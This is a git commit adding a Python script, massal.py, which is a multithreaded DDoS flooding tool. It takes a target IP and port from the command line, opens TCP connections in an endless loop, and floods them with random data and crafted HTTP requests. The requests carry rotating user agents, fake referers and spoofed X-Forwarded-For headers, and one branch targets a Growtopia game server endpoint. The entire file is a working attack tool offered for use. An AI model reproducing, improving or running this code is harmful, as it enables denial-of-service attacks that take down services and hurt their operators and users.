07de3b9395d624276efec91ea8d4fd2be9722811
PhynX <48216256+PhynX404@users.noreply.github.com>
2021-09-01 18:40:06 +0700

    Create massal.py

---
+++ massal.py
@@ -0,0 +1,123 @@
+import os, sys
+import socks, requests, wget, urllib3
+useragents = [
+     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
+     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
+     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1']
+acceptall = [
+     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
+     'Accept-Encoding: gzip, deflate\r\n'
+]
+referers = ['http://help.baidu.com/searchResult?keywords=',
+'http://www.bing.com/search?q=',
+'https://www.yandex.com/yandsearch?text=',
+'https://duckduckgo.com/?q=',
+'http://www.ask.com/web?q=',
+'http://search.aol.com/aol/search?q=',
+'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
+'https://drive.google.com/viewerng/viewer?url=',
+'http://validator.w3.org/feed/check.cgi?url=',
+'http://host-tracker.com/check_page/?furl=',
+'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
+'http://jigsaw.w3.org/css-validator/validator?uri=',
+'https://add.my.yahoo.com/rss?url=',
+'http://www.google.com/?q=',
+'http://www.usatoday.com/search/results?q=',
+'http://engadget.search.aol.com/search?q=',
+'https://steamcommunity.com/market/search?q=',
+'http://filehippo.com/search?q=',
+'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
+'http://eu.battle.net/wow/en/search?q=']
+
+import random
+import socket
+import threading
+
+ip = str(sys.argv[1])
+port = int(sys.argv[2])
+method_attack = int(sys.argv[3])
+times = int(sys.argv[4])
+threads = int(sys.argv[5])
+
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return assemebled
+
+def Headers(method):
+    header = ""
+    if method == "get" or method == "head":
+        connection = "Connection: Keep-Alive\r\n"
+        accept = random.choice(acceptall) + "\r\n"
+        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
+        referer = "Referer: " + random.choice(referers) + ip + "\r\n"
+        connection += "Cache-Control: max-age=0\r\n"
+        connection += "pragma: no-cache\r\n"
+        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+        randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
+        forward = "X-Forwarded-For: 1\r\n"
+        forward += "Client-IP: 10000\r\n"
+        length = "Content-Length: 100\r\nConnection: Keep-Alive\r\n"
+        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+        header = referer + forward + useragent + accept + content + connection +  length + "\r\n\r\n"
+    return header
+
+def run():
+    header = Headers("get")
+    data = random._urandom(9048)
+    if method_attack == "1":
+        get_host = "GET / HTTP/1.1\r\nHost: " + ip + "\r\n"
+        request  = get_host + header + "\r\n"
+    else:
+        get_host = random.choice(['GET','POST']) + " /growtopia/server_data.php HTTP/1.0\r\nHost: growtopia1.com\r\n"
+        request  = get_host + header + "\r\n"
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.connect((ip,port))
+            s.send(data)
+            s.send(data)
+            s.send(data)
+            s.send(data)
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.send(data)
+            s.send(data)
+            s.send(data)
+            s.send(data)
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            s.sendall(str.encode(request))
+            for x in range(times):
+                s.send(data)
+                s.send(data)
+                s.send(data)
+                s.send(data)
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.send(data)
+                s.send(data)
+                s.send(data)
+                s.send(data)
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+            print(f"[+] Sending massal DDoS to => {ip}:{port}")
+        except:
+            s.close()
+
+for y in range(threads):
+    th = threading.Thread(target = run)
+    th.start()
